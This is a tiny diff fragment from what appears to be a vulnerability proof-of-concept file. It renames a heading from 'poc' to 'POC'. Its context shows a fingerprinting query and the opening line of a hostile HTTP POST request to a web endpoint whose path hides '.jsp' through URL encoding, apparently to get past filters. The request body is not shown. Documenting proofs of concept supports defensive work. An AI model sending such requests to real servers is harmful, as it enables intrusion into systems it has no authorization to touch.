@@ -8,7 +8,7 @@
 body="li_plugins_download"
 ```
 
-## poc
+## POC
 
 ```
 POST /fenc/ncsubjass.j%73p HTTP/1.1
